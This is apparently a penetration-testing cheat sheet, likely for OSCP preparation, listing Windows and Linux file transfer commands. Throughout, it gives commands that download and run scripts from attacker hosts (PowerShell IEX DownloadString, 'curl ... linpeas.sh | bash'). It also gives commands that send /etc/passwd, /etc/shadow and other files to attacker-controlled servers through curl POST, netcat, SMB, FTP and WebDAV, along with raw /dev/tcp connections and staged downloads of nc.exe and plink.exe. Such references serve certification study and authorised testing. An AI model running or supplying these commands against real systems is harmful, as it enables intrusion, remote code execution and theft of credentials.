# 📁 File Transfer

For more detailed methods: [https://hackersinterview.com/oscp/oscp-cheatsheet-windows-file-transfer-techniques/](https://hackersinterview.com/oscp/oscp-cheatsheet-windows-file-transfer-techniques/)&#x20;

Use my transfile.sh script from [here](https://github.com/AdityaHebballe/Pentest-Scripts/)

## Windows

### Powershell

<mark style="color:purple;">**Download file**</mark>

{% code overflow="wrap" %}
```
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.2/exploit.exe', 'exploit.exe')
```
{% endcode %}

<mark style="color:purple;">**Download and execute without saving on disk**</mark>

{% code overflow="wrap" %}
```
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.1.2/test.ps1')
```
{% endcode %}

<mark style="color:purple;">**To encode using powershell:**</mark>

{% code title="Decode in linux with base64 -d" overflow="wrap" %}
```powershell
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```
{% endcode %}

<mark style="color:purple;">**To upload using powershell**</mark>

{% code overflow="wrap" %}
```
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```
{% endcode %}

{% code title="Use python -m uploadserver on target" %}
```
Invoke-FileUpload -Uri http://10.10.14.24:80/upload -File C:\Windows\System32\drivers\etc\hosts
```
{% endcode %}

### CMD

```
certutil -urlcache -f ${file url} filename
```

```
powershell wget -Uri http://192.168.45.183/plink.exe -OutFile C:\Windows\Temp\plink.exe
```

## Linux and Windows

### Python Server

Attacker:

```bash
updog -p 80
```

OR

```bash
python3 -m uploadserver
```

Target:

Download

{% code title="Use PSUpload.ps1" overflow="wrap" %}
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://<ip>:8000/upload -File C:\Path\to\file
```
{% endcode %}

Upload:

{% code overflow="wrap" %}
```bash
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```
{% endcode %}

To base64 encode:

{% code overflow="wrap" %}
```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Path\to\file' -Encoding Byte))
Invoke-WebRequest -Uri http://<ip>:8000/ -Method POST -Body $b64
```
{% endcode %}

### Apache Server

```bash
sudo systemctl start apache2
```

```
sudo cp /path/to/file.exe /var/www/html/
```

{% code title="download from apache server on powershell" %}
```powershell
powershell wget -Uri http://192.168.118.4/nc.exe -OutFile C:\Windows\Temp\nc.exe
```
{% endcode %}

### SMB

Attacker:

```bash
impacket-smbserver NAME $(pwd) -smb2support -user aditya -password aditya
```

Target(powershell):

{% code title="Copy files" %}
```bash
copy \\192.168.220.133\share\nc.exe
```
{% endcode %}

{% code title="Authenticated mount" %}
```powershell
net use n: \\10.10.14.24\share /user:test test
```
{% endcode %}

or

{% code overflow="wrap" %}
```powershell
$pass = convertto-securestring 'aditya' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential{'aditya',$pass}
New-PSDrive -Name aditya -PSProvide FileSystem -Credential $cred -Root \\10.10.14.24\aditya
cd aditya:
```
{% endcode %}

### FTP :&#x20;

* Attacker : To Host

```
python -m pyftpdlib 21
```

* Target:&#x20;

```
ftp ${IP}
```

#### To Upload:

Attacker:

```bash
sudo python3 -m pyftpdlib --port 21 --write
```

Target:

{% code title="Powershell" %}
```powershell
(New-Object Net.WebClient).UploadFile('ftp://<ip>/ftp-hosts', 'C:\Path\to\File')
```
{% endcode %}

{% code title="CMD" %}
```
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt

ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```
{% endcode %}

### Webdav (If port 445 restrictions present)

Attcker:

```bash
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```

target:

{% code title="The DavWWWRoot is required in windows" %}
```powershell
dir \\192.168.49.128\DavWWWRoot
```
{% endcode %}

{% code title="To upload" %}
```
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
```
{% endcode %}

## Linux

### If no write permissions:

```bash
curl 10.10.14.22/linpeas.sh | bash
```

### Bash

```bash
#Connect to the Target Webserver
exec 3<>/dev/tcp/10.10.10.32/80
#HTTP GET Request
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
#Print the Response
cat <&3
```

### Netcat

**To read files:**

```bash
nc -nv 192.168.49.249 80 < /etc/passwd
```

To receive:

```bash
nc -nlvp 80
```

**Using netcat to send files:**

Target

```bash
nc -l -p 1234 -q 1 > something.zip < /dev/null
```

Attack

```bash
cat something.zip | netcat <ip> 1234
```

## SSH

If creds are available

```bash
scp linenum.sh user@remotehost:/remote/path/
```

## Base64

{% hint style="info" %}
Use mf5sum command to verify and file command to check type
{% endhint %}

### Linux

To get base64 output of the file:

```bash
base64 file -w 0
```

Decrypt

{% code title="file command to validate" %}
```bash
echo "base64 string" | base64 -d > file
```
{% endcode %}

### Powershell

{% code title="To verify: Get-FileHash C:\Users\Public\filename -Algorithm md5" overflow="wrap" %}
```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\filename", [Convert]::FromBase64String("base64string"))
```
{% endcode %}
